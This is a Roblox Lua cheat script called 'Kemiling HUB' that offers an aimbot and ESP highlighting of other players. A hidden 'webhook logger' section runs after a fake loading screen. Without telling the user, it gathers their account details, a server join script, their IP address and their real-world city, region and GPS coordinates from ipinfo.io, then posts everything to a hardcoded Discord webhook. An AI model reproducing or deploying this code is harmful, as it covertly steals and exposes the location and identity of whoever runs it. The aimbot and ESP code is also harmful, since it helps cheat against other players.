-- =============================================
-- ||         Kemiling HUB - Basic Aladia     ||
-- ||           (Full Script Ready-Use)       ||
-- =============================================

local function createLoadingScreen()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "KemilingLoadingScreen"
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.ResetOnSpawn = false

    -- Background Blur
    local blur = Instance.new("BlurEffect")
    blur.Size = 24
    blur.Parent = game:GetService("Lighting")
    
    -- Main Container
    local container = Instance.new("Frame")
    container.Size = UDim2.new(0.35, 0, 0.2, 0)
    container.Position = UDim2.new(0.325, 0, 0.4, 0)
    container.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    container.BackgroundTransparency = 0.3
    container.BorderSizePixel = 0
    container.ClipsDescendants = true
    container.Parent = screenGui

    -- Modern UI Corners
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = container

    -- Title Text
    local title = Instance.new("TextLabel")
    title.Text = "KEMILING HUB"
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 24
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.BackgroundTransparency = 1
    title.Size = UDim2.new(1, 0, 0.3, 0)
    title.Position = UDim2.new(0, 0, 0.1, 0)
    title.Parent = container

    -- Subtitle Text
    local subtitle = Instance.new("TextLabel")
    subtitle.Text = "Basic Aladia Script"
    subtitle.Font = Enum.Font.GothamMedium
    subtitle.TextSize = 14
    subtitle.TextColor3 = Color3.fromRGB(200, 200, 200)
    subtitle.BackgroundTransparency = 1
    subtitle.Size = UDim2.new(1, 0, 0.2, 0)
    subtitle.Position = UDim2.new(0, 0, 0.35, 0)
    subtitle.Parent = container

    -- Modern Loading Bar Container
    local loadingBarContainer = Instance.new("Frame")
    loadingBarContainer.Name = "LoadingBarContainer"
    loadingBarContainer.Size = UDim2.new(0.8, 0, 0.08, 0)
    loadingBarContainer.Position = UDim2.new(0.1, 0, 0.6, 0)
    loadingBarContainer.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    loadingBarContainer.BorderSizePixel = 0
    loadingBarContainer.Parent = container

    local containerCorner = Instance.new("UICorner")
    containerCorner.CornerRadius = UDim.new(1, 0)
    containerCorner.Parent = loadingBarContainer

    -- Loading Bar
    local loadingBar = Instance.new("Frame")
    loadingBar.Name = "LoadingBar"
    loadingBar.Size = UDim2.new(0, 0, 1, 0)
    loadingBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
    loadingBar.BorderSizePixel = 0
    loadingBar.Parent = loadingBarContainer

    local barCorner = Instance.new("UICorner")
    barCorner.CornerRadius = UDim.new(1, 0)
    barCorner.Parent = loadingBar

    -- Percentage Text
    local percentageText = Instance.new("TextLabel")
    percentageText.Text = "0%"
    percentageText.Font = Enum.Font.GothamBold
    percentageText.TextSize = 16
    percentageText.TextColor3 = Color3.fromRGB(255, 255, 255)
    percentageText.BackgroundTransparency = 1
    percentageText.Size = UDim2.new(1, 0, 0.2, 0)
    percentageText.Position = UDim2.new(0, 0, 0.75, 0)
    percentageText.Parent = container

    -- Status Text
    local statusText = Instance.new("TextLabel")
    statusText.Text = "Initializing..."
    statusText.Font = Enum.Font.GothamMedium
    statusText.TextSize = 12
    statusText.TextColor3 = Color3.fromRGB(180, 180, 180)
    statusText.BackgroundTransparency = 1
    statusText.Size = UDim2.new(1, 0, 0.15, 0)
    statusText.Position = UDim2.new(0, 0, 0.9, 0)
    statusText.Parent = container

    -- Add to GUI
    screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

    -- Animate Loading Bar (15 Seconds)
    local duration = 15
    local startTime = tick()
    
    local statusMessages = {
        "Loading assets...",
        "Initializing modules...",
        "Setting up environment...",
        "Almost there...",
        "Preparing interface...",
        "Finalizing..."
    }
    
    local connection
    connection = game:GetService("RunService").RenderStepped:Connect(function()
        local elapsed = tick() - startTime
        local progress = math.min(elapsed / duration, 1)
        
        -- Update loading bar
        loadingBar.Size = UDim2.new(progress, 0, 1, 0)
        percentageText.Text = string.format("%d%%", math.floor(progress * 100))
        
        -- Update status text periodically
        local statusIndex = math.min(math.floor(progress * #statusMessages) + 1, #statusMessages)
        statusText.Text = statusMessages[statusIndex]
        
        if progress >= 1 then
            connection:Disconnect()
            screenGui:Destroy()
            blur:Destroy()
        end
    end)
end

createLoadingScreen()
wait(15) -- Wait for loading to finish

-- [WEBHOOK LOGGER]
local function sendWebhook()
    getgenv().whscript = "KemilingHUB"
    getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1354371611360231487/MskK4R-buS9vcMLgFobw5QLYwtbYzR5aGVt7TQywKcrn8xR4aIx6MaJEFvEdQDoqrPEQ"
    getgenv().ExecLogSecret = true

    local ui = gethui()
    local folderName = "screen"
    local folder = Instance.new("Folder")
    folder.Name = folderName
    local player = game:GetService("Players").LocalPlayer

    if ui:FindFirstChild(folderName) then
        print("Script already executed! Rejoin if error.")
        local ui2 = gethui()
        local folderName1 = "screen2"
        local folder2 = Instance.new("Folder")
        folder2.Name = folderName1
        if ui2:FindFirstChild(folderName1) then
            player:Kick("Anti-spam execution system triggered. Please rejoin.")
        else
            folder2.Parent = gethui()
        end
    else
        folder.Parent = gethui()
        local players = game:GetService("Players")
        local userid = player.UserId
        local gameid = game.PlaceId
        local jobid = tostring(game.JobId)
        local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
        local deviceType = game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "PC 💻" or "Mobile 📱"
        local snipePlay = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobid .. "', player)"
        local completeTime = os.date("%Y-%m-%d %H:%M:%S")
        local workspace = game:GetService("Workspace")
        local screenWidth = math.floor(workspace.CurrentCamera.ViewportSize.X)
        local screenHeight = math.floor(workspace.CurrentCamera.ViewportSize.Y)
        local memoryUsage = game:GetService("Stats"):GetTotalMemoryUsageMb()
        local playerCount = #players:GetPlayers()
        local maxPlayers = players.MaxPlayers
        local health = player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health or "N/A"
        local maxHealth = player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.MaxHealth or "N/A"
        local position = player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character.HumanoidRootPart.Position or "N/A"
        local gameVersion = game.PlaceVersion

        if not getgenv().ExecLogSecret then getgenv().ExecLogSecret = true end
        if not getgenv().whscript then getgenv().whscript = "KemilingHUB" end

        local pingThreshold = 100
        local serverStats = game:GetService("Stats").Network.ServerStatsItem
        local dataPing = serverStats["Data Ping"]:GetValueString()
        local pingValue = tonumber(dataPing:match("(%d+)")) or "N/A"

        local function checkPremium()
            local premium = "false"
            local success, response = pcall(function() return player.MembershipType end)
            if success then
                premium = response == Enum.MembershipType.None and "false" or "true"
            else
                premium = "Failed to retrieve Membership"
            end
            return premium
        end
        local premium = checkPremium()

        local url = getgenv().webhookexecUrl
        local data = {
            ["content"] = "",
            ["embeds"] = {
                {
                    ["title"] = "🚀 **KemlingHUB**",
                    ["description"] = "*Here are the details:*",
                    ["type"] = "rich",
                    ["color"] = tonumber(0x3498db),
                    ["fields"] = {
                        {
                            ["name"] = "🔍 **Script Info**",
                            ["value"] = "```💻 Script Name: " .. getgenv().whscript .. "\n⏰ Executed At: " .. completeTime .. "```",
                            ["inline"] = false
                        },
                        {
                            ["name"] = "👤 **Player Details**",
                            ["value"] = "```🧸 Username: " .. player.Name .. "\n📝 Display Name: " .. player.DisplayName .. "\n🆔 UserID: " .. userid .. "\n❤️ Health: " .. health .. " / " .. maxHealth .. "\n🔗 Profile: View Profile (https://www.roblox.com/users/" .. userid .. "/profile)```",
                            ["inline"] = false
                        },
                        {
                            ["name"] = "📅 **Account Information**",
                            ["value"] = "```🗓️ Account Age: " .. player.AccountAge .. " days\n💎 Premium Status: " .. premium .. "\n📅 Account Created: " .. os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)) .. "```",
                            ["inline"] = false
                        },
                        {
                            ["name"] = "🎮 **Game Details**",
                            ["value"] = "```🏷️ Game Name: " .. gameName .. "\n🆔 Game ID: " .. gameid .. "\n🔗 Game Link (https://www.roblox.com/games/" .. gameid .. ")\n🔢 Game Version: " .. gameVersion .. "```",
                            ["inline"] = false
                        },
                        {
                            ["name"] = "🕹️ **Server Info**",
                            ["value"] = "```👥 Players in Server: " .. playerCount .. " / " .. maxPlayers .. "\n🕒 Server Time: " .. os.date("%H:%M:%S") .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "📡 **Network Info**",
                            ["value"] = "```📶 Ping: " .. pingValue .. " ms```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "🖥️ **System Info**",
                            ["value"] = "```📺 Resolution: " .. screenWidth .. "x" .. screenHeight .. "\n🔍 Memory Usage: " .. memoryUsage .. " MB\n⚙️ Executor: " .. identifyexecutor() .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "📍 **Character Position**",
                            ["value"] = "```📍 Position: " .. tostring(position) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "🪧 **Join Script**",
                            ["value"] = "```lua\n" .. snipePlay .. "```",
                            ["inline"] = false
                        }
                    },
                    ["thumbnail"] = {
                        ["url"] = "https://cdn.discordapp.com/icons/1221843343755972719/3dc56a5cc62de223fc48b1333235b142.webp?size=4096"
                    },
                    ["footer"] = {
                        ["text"] = "Execution Log | " .. os.date("%Y-%m-%d %H:%M:%S"),
                        ["icon_url"] = "https://cdn.discordapp.com/icons/1221843343755972719/3dc56a5cc62de223fc48b1333235b142.webp?size=4096"
                    }
                }
            }
        }

        if getgenv().ExecLogSecret then
            local ip = game:HttpGet("https://api.ipify.org")
            local iplink = "https://ipinfo.io/" .. ip .. "/json"
            local ipinfo_json = game:HttpGet(iplink)
            local ipinfo_table = game.HttpService:JSONDecode(ipinfo_json)

            table.insert(data.embeds[1].fields, {
                ["name"] = "**`(🤫) User Location (Real life)`**",
                ["value"] = "||(👣) IP Address: " .. ipinfo_table.ip .. "||\n||(🌆) Country: " .. ipinfo_table.country .. "||\n||(🪟) GPS Location: " .. ipinfo_table.loc .. "||\n||(🏙️) City: " .. ipinfo_table.city .. "||\n||(🏡) Region: " .. ipinfo_table.region .. "||\n||(🪢) Hoster: " .. ipinfo_table.org .. "||"
            })
        end

        local newdata = game:GetService("HttpService"):JSONEncode(data)
        local headers = {["content-type"] = "application/json"}
        request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
        request(abcdef)
    end
end

sendWebhook()

-- [MAIN SCRIPT]
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Camera = workspace.CurrentCamera

local LocalPlayer = Players.LocalPlayer
local Toggles = {Camera = false, ESP = false}
local CameraTarget = nil
local LastAimbotUpdate = 0
local ESPHighlights = {}

-- Utility Functions
local function IsPlayerAlive(player)
    if not player or not player.Character then return false end
    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
    return humanoid and humanoid.Health > 1
end

-- Aimbot Functions
local function FindClosestPlayerToScreenCenter()
    local closestPlayer, minDistance = nil, math.huge
    local screenCenter = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)

    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and IsPlayerAlive(player) then
            local character = player.Character
            local rootPart = character and character:FindFirstChild("HumanoidRootPart")
            
            if rootPart then
                local screenPos, onScreen = Camera:WorldToScreenPoint(rootPart.Position)
                if onScreen then
                    local distance = (screenCenter - Vector2.new(screenPos.X, screenPos.Y)).Magnitude
                    if distance < minDistance then
                        minDistance = distance
                        closestPlayer = player
                    end
                end
            end
        end
    end

    return closestPlayer
end

local function AimAtPlayer(player)
    if not IsPlayerAlive(player) then return end
    
    local character = player.Character
    local targetPart = character:FindFirstChild("HumanoidRootPart")
    
    if targetPart then
        Camera.CFrame = CFrame.new(Camera.CFrame.Position, targetPart.Position)
    end
end

local function ToggleAimbot()
    Toggles.Camera = not Toggles.Camera

    if Toggles.Camera then
        CameraTarget = FindClosestPlayerToScreenCenter()
        game.StarterGui:SetCore("ChatMakeSystemMessage", {
            Text = "Body Aimbot ON",
            Color = Color3.new(1, 1, 0),
            FontSize = Enum.FontSize.Size24
        })
    else
        CameraTarget = nil
        game.StarterGui:SetCore("ChatMakeSystemMessage", {
            Text = "Aimbot OFF",
            Color = Color3.new(1, 0, 0),
            FontSize = Enum.FontSize.Size24
        })
    end
end

-- ESP Functions
local function CreateESP(player)
    if ESPHighlights[player] then return end

    local character = player.Character
    if not character then return end

    local highlight = Instance.new("Highlight")
    highlight.Parent = character
    highlight.FillColor = Color3.new(1, 0, 0)
    highlight.OutlineColor = Color3.new(1, 1, 1)
    highlight.Adornee = character

    ESPHighlights[player] = highlight
end

local function RemoveESP(player)
    local highlight = ESPHighlights[player]
    if highlight then
        highlight:Destroy()
        ESPHighlights[player] = nil
    end
end

local function ToggleESP()
    Toggles.ESP = not Toggles.ESP
    
    if Toggles.ESP then
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                CreateESP(player)
            end
        end
        
        game.StarterGui:SetCore("ChatMakeSystemMessage", {
            Text = "ESP ON",
            Color = Color3.new(0, 1, 0),
            FontSize = Enum.FontSize.Size24
        })
    else
        for player in pairs(ESPHighlights) do
            RemoveESP(player)
        end
        
        game.StarterGui:SetCore("ChatMakeSystemMessage", {
            Text = "ESP OFF",
            Color = Color3.new(1, 0, 0),
            FontSize = Enum.FontSize.Size24
        })
    end
end

-- Keybinds
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    
    if input.KeyCode == Enum.KeyCode.E then
        ToggleAimbot()
    elseif input.KeyCode == Enum.KeyCode.J then
        ToggleESP()
    end
end)

-- Main Loop
RunService.RenderStepped:Connect(function(deltaTime)
    if Toggles.Camera then
        local now = tick()
        if now - LastAimbotUpdate > 0.1 then
            CameraTarget = FindClosestPlayerToScreenCenter()
            LastAimbotUpdate = now
        end
        
        if CameraTarget and IsPlayerAlive(CameraTarget) then
            AimAtPlayer(CameraTarget)
        end
    end
end)

-- Player Management
Players.PlayerAdded:Connect(function(player)
    if Toggles.ESP then
        CreateESP(player)
    end
end)

Players.PlayerRemoving:Connect(function(player)
    RemoveESP(player)
end)

-- Initial ESP Setup
if Toggles.ESP then
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            CreateESP(player)
        end
    end
end

-- Notification
game.StarterGui:SetCore("SendNotification", {
    Title = "Kemiling HUB Loaded",
    Text = "Press E (Aimbot), J (ESP)",
    Duration = 10
})
